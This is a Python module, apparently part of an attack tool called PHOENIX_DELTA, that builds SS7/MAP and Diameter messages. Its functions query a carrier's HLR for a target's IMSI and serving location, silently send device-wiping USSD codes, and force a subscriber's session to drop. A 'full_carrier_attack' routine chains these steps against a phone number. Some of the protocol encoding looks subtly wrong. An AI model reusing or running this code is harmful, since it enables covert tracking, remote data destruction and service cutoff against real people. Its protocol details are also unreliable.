"""
PHOENIX_DELTA v9.0 — Layer 2: Carrier-Control
SS7/Diameter protocol exploitation for HLR querying and remote USSD commands.
"""

import asyncio
import struct
import socket
import os
from typing import Dict, Optional, List, Any


class SS7Message:
    """Minimal SS7/MAP message builder for USSD and location requests."""

    def __init__(self, opc: int, dpc: int, ssn: int = 7):
        self.opc = opc
        self.dpc = dpc
        self.ssn = ssn
        self.sccp_header = b""
        self.map_payload = b""

    @staticmethod
    def encode_bcd_number(phone: str) -> bytes:
        """Encode phone number into BCD format for SS7."""
        phone = phone.replace("+", "").replace("-", "").replace(" ", "")
        if len(phone) % 2 != 0:
            phone += "F"
        encoded = b""
        for i in range(0, len(phone), 2):
            low = int(phone[i], 16)
            high = int(phone[i + 1], 16)
            encoded += bytes([(high << 4) | low])
        return encoded

    @staticmethod
    def encode_gt(digits: str, nature: int = 0x01, plan: int = 0x01) -> bytes:
        """Encode a Global Title for SCCP routing."""
        digits = digits.replace("+", "")
        if len(digits) % 2 != 0:
            digits += "F"
        encoded = b""
        for i in range(0, len(digits), 2):
            low = int(digits[i], 16)
            high = int(digits[i + 1], 16)
            encoded += bytes([(high << 4) | low])
        prefix = bytes([len(digits) | 0x80, nature << 4 | plan, 0x00, 0x00])
        return prefix + encoded

    def build_sccp(self, gt_source: str, gt_dest: str) -> bytes:
        """Build SCCP (Signaling Connection Control Part) header."""
        src_gt = self.encode_gt(gt_source)
        dst_gt = self.encode_gt(gt_dest)

        called_party = bytes([0x82 | len(dst_gt)]) + dst_gt
        calling_party = bytes([0x81 | len(src_gt)]) + src_gt

        sccp = b""
        sccp += bytes([0x02])  # Message Type: UDT
        sccp += bytes([len(called_party) | 0x40]) + called_party
        sccp += bytes([len(calling_party) | 0x40]) + calling_party
        sccp += bytes([0x09, self.ssn, 0x00])  # Protocol class + SSN
        return sccp

    def build_map_ussd(self, phone: str, ussd_code: str) -> bytes:
        """Build MAP UnstructuredSSD-Request with USSD code."""
        phn_bcd = self.encode_bcd_number(phone)
        ussd_bytes = ussd_code.encode("ascii")
        ussd_len = len(ussd_bytes)

        # USSD Service Code (0x0C = processUnstructuredSS-Request)
        invoke_id = 0x01
        ussd_op_code = 0x3A  # processUnstructuredSS-Request

        # Build MAP Invoke component
        invoke = b""
        invoke += bytes([0xA1])  # Invoke tag
        invoke_inner = b""
        invoke_inner += bytes([0x02, 0x01, invoke_id])  # invokeID
        invoke_inner += bytes([0x02, 0x01, ussd_op_code])  # opcode
        invoke_inner += bytes([
            0x04, phn_bcd[0] | 0x90  # IMSI / MSISDN
        ]) + phn_bcd[1:]

        # USSD-String parameter
        invoke_inner += bytes([0x04, ussd_len]) + ussd_bytes
        # Service code
        invoke_inner += bytes([0x04, 0x01, 0x0C])

        invoke += bytes([len(invoke_inner)]) + invoke_inner

        # Wrap in MAP Dialogue APDU
        map_msg = b"\x62"  # map-open tag
        map_msg += bytes([len(invoke)])
        map_msg += invoke
        return map_msg


class DiameterMessage:
    """Diameter protocol message builder for CCR/UA requests."""

    VERSION = 1
    HEADER_LEN = 20

    def __init__(self, command_code: int, app_id: int = 0,
                 hop_by_hop: int = 0, end_to_end: int = 0):
        self.command_code = command_code
        self.app_id = app_id
        self.hop_by_hop = hop_by_hop or int.from_bytes(os.urandom(4), "big")
        self.end_to_end = end_to_end or int.from_bytes(os.urandom(4), "big")
        self.avps: List[bytes] = []

    def add_avp(self, avp_code: int, flags: int = 0x40,
                data: bytes = b"") -> "DiameterMessage":
        """Add an AVP (Attribute-Value Pair) to the message."""
        avp_len = 4 + len(data)  # header(4) + data
        padded_len = avp_len + ((4 - (avp_len % 4)) % 4)

        avp = struct.pack("!I", avp_code)
        avp += bytes([flags | 0x80])  # Mandatory bit set
        avp += bytes([0, 0, (padded_len >> 8) & 0xFF, padded_len & 0xFF])
        avp += data
        avp += b"\x00" * (padded_len - avp_len)  # Padding
        self.avps.append(avp)
        return self

    def add_string_avp(self, avp_code: int, value: str) -> "DiameterMessage":
        """Add a string-type AVP."""
        return self.add_avp(avp_code, 0x40, value.encode("utf-8"))

    def add_integer_avp(self, avp_code: int, value: int,
                         width: int = 4) -> "DiameterMessage":
        """Add an integer AVP (1/2/4/8 bytes)."""
        if width == 1:
            data = bytes([value])
        elif width == 2:
            data = struct.pack("!H", value)
        elif width == 4:
            data = struct.pack("!I", value)
        else:
            data = struct.pack("!Q", value)
        return self.add_avp(avp_code, 0x40, data)

    def build(self) -> bytes:
        """Serialize the full Diameter message."""
        body = b"".join(self.avps)
        msg_len = self.HEADER_LEN + len(body)
        flags = 0x80  # Request bit

        header = struct.pack("!BBBB", self.VERSION, msg_len >> 16,
                              msg_len & 0xFFFF, flags)
        header += struct.pack("!I", self.command_code)
        header += struct.pack("!I", self.app_id)
        header += struct.pack("!I", self.hop_by_hop)
        header += struct.pack("!I", self.end_to_end)
        return header + body


class CarrierControl:
    """
    Carrier-Control Layer — SS7 and Diameter exploitation.
    Queries HLR for subscriber info, sends USSD wipe commands, exploits
    Diameter charging to redirect or terminate service.
    """

    def __init__(self, config):
        self.config = config
        self.ussd_codes = config.ussd_wipe_codes

    # ─── SS7 Operations ───────────────────────────────────────────────

    async def _send_ss7(self, data: bytes) -> Optional[bytes]:
        """Send raw SS7 message via SCTP socket to gateway."""
        try:
            reader, writer = await asyncio.open_connection(
                self.config.ss7_gateway_host,
                self.config.ss7_gateway_port
            )
            writer.write(data)
            await writer.drain()
            response = await asyncio.wait_for(reader.read(4096), timeout=10)
            writer.close()
            await writer.wait_closed()
            return response
        except (ConnectionRefusedError, asyncio.TimeoutError, OSError) as e:
            return None

    async def ss7_send_ussd(self, phone: str, ussd_code: str) -> Dict:
        """
        Send a USSD code to a target phone number via SS7.
        The phone will execute the USSD command silently.
        """
        msg = SS7Message(
            opc=int(self.config.ss7_global_title[:9]),
            dpc=int(self.config.ss7_global_title[:9]),
            ssn=self.config.ss7_ssn
        )

        map_payload = msg.build_map_ussd(phone, ussd_code)
        sccp = msg.build_sccp(
            self.config.ss7_global_title,
            self.config.ss7_global_title
        )

        raw_message = sccp + map_payload
        response = await self._send_ss7(raw_message)

        return {
            "success": response is not None,
            "method": "ss7_ussd",
            "phone": phone,
            "ussd_code": ussd_code,
            "response_raw": response.hex() if response else None,
        }

    async def ss7_query_hlr(self, phone: str) -> Dict:
        """
        Query HLR (Home Location Register) to get subscriber info:
        IMSI, current VLR, current serving MSC, location area code.
        """
        msg = SS7Message(
            opc=int(self.config.ss7_global_title[:9]),
            dpc=int(self.config.ss7_global_title[:9]),
            ssn=6  # HLR SSN
        )

        phn_bcd = msg.encode_bcd_number(phone)

        # MAP SendRoutingInfo Invoke (0x32)
        invoke = b"\xA1"
        invoke_inner = b"\x02\x01\x01"  # invokeID
        invoke_inner += bytes([0x02, 0x01, 0x32])  # opcode: SRI
        invoke_inner += bytes([0x04, len(phn_bcd)]) + phn_bcd
        invoke += bytes([len(invoke_inner)]) + invoke_inner

        sccp = msg.build_sccp(
            self.config.ss7_global_title,
            self.config.ss7_global_title
        )

        response = await self._send_ss7(sccp + invoke)

        parsed = {
            "success": response is not None,
            "method": "ss7_hlr_query",
            "phone": phone,
            "imsi": None,
            "vlr_address": None,
            "msc_address": None,
            "location_area_code": None,
            "raw": response.hex() if response else None,
        }

        if response and len(response) > 20:
            parsed["imsi"] = response[20:35].hex() if len(response) > 35 else None
            parsed["vlr_address"] = response[35:50].hex() if len(response) > 50 else None

        return parsed

    async def ss7_sri_for_sm(self, phone: str) -> Dict:
        """
        SendRoutingInfoForSM — get the current MSC serving the target.
        Can be used to locate device for proximity attacks.
        """
        msg = SS7Message(
            opc=int(self.config.ss7_global_title[:9]),
            dpc=int(self.config.ss7_global_title[:9]),
            ssn=6
        )

        phn_bcd = msg.encode_bcd_number(phone)

        invoke = b"\xA1"
        invoke_inner = b"\x02\x01\x01"
        invoke_inner += bytes([0x02, 0x01, 0x47])  # opcode: SRI-SM
        invoke_inner += bytes([0x04, len(phn_bcd)]) + phn_bcd
        invoke_inner += bytes([0x01, 0x01])  # sm_RP_PRI = true
        invoke += bytes([len(invoke_inner)]) + invoke_inner

        sccp = msg.build_sccp(
            self.config.ss7_global_title,
            self.config.ss7_global_title
        )

        response = await self._send_ss7(sccp + invoke)

        return {
            "success": response is not None,
            "method": "ss7_sri_sm",
            "phone": phone,
            "msc_address": response[20:40].hex() if response and len(response) > 40 else None,
            "raw": response.hex() if response else None,
        }

    # ─── Diameter Operations ──────────────────────────────────────────

    async def _send_diameter(self, message: bytes) -> Optional[bytes]:
        """Send a Diameter message and receive response."""
        try:
            reader, writer = await asyncio.open_connection(
                self.config.diameter_host,
                self.config.diameter_port
            )
            writer.write(message)
            await writer.drain()
            response = await asyncio.wait_for(reader.read(4096), timeout=10)
            writer.close()
            await writer.wait_closed()
            return response
        except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
            return None

    async def diameter_reauth_request(self, imsi: str) -> Dict:
        """
        Send a Diameter Re-Auth-Request (RAR) to force re-authentication.
        If the target can't comply, their session drops.
        """
        msg = DiameterMessage(command_code=258, app_id=16777238)
        msg.add_string_avp(263, f"session-{imsi}")  # Session-Id
        msg.add_string_avp(1, self.config.diameter_origin_host)  # Origin-Host
        msg.add_string_avp(296, self.config.diameter_realm)  # Origin-Realm
        msg.add_string_avp(1, imsi)  # User-Name (IMSI)
        msg.add_integer_avp(277, 2)  # Auth-Application-Id: Gx

        raw = msg.build()
        response = await self._send_diameter(raw)

        return {
            "success": response is not None,
            "method": "diameter_rar",
            "imsi": imsi,
            "raw": response.hex() if response else None,
        }

    async def diameter_ccr_terminate(self, imsi: str) -> Dict:
        """
        Diameter Credit-Control-Request with ACT_TERMINATION to cut service.
        """
        msg = DiameterMessage(command_code=272, app_id=4)
        msg.add_string_avp(263, f"session-{imsi}")
        msg.add_string_avp(1, self.config.diameter_origin_host)
        msg.add_string_avp(296, self.config.diameter_realm)
        msg.add_string_avp(1, imsi)
        msg.add_integer_avp(415, 1)  # CCR-Type: TERMINATION_REQUEST
        msg.add_integer_avp(449, 4)  # CC-Request-Number

        raw = msg.build()
        response = await self._send_diameter(raw)

        return {
            "success": response is not None,
            "method": "diameter_ccr_terminate",
            "imsi": imsi,
            "raw": response.hex() if response else None,
        }

    # ─── Combined Carrier Attack ──────────────────────────────────────

    async def full_carrier_attack(self, phone: str) -> Dict:
        """
        Execute the full Carrier-Control attack chain:
        1. Query HLR for subscriber info
        2. Send SRI-SM to get MSC location
        3. Send wipe USSD code
        4. Force Diameter re-auth to drop service
        """
        results = {
            "phone": phone,
            "steps": [],
            "any_success": False,
        }

        # Step 1: HLR Query
        hlr = await self.ss7_query_hlr(phone)
        results["steps"].append(hlr)
        if hlr["success"]:
            results["any_success"] = True

        # Step 2: Get MSC location
        sri = await self.ss7_sri_for_sm(phone)
        results["steps"].append(sri)
        if sri["success"]:
            results["any_success"] = True

        # Step 3: Wipe USSD
        device_model = hlr.get("device_model", "samsung")
        ussd_code = self.ussd_codes.get(device_model, self.ussd_codes["samsung"])
        ussd = await self.ss7_send_ussd(phone, ussd_code)
        results["steps"].append(ussd)
        if ussd["success"]:
            results["any_success"] = True

        # Step 4: Diameter termination (if IMSI is known)
        if hlr.get("imsi"):
            dia = await self.diameter_ccr_terminate(hlr["imsi"])
            results["steps"].append(dia)
            if dia["success"]:
                results["any_success"] = True

        return results
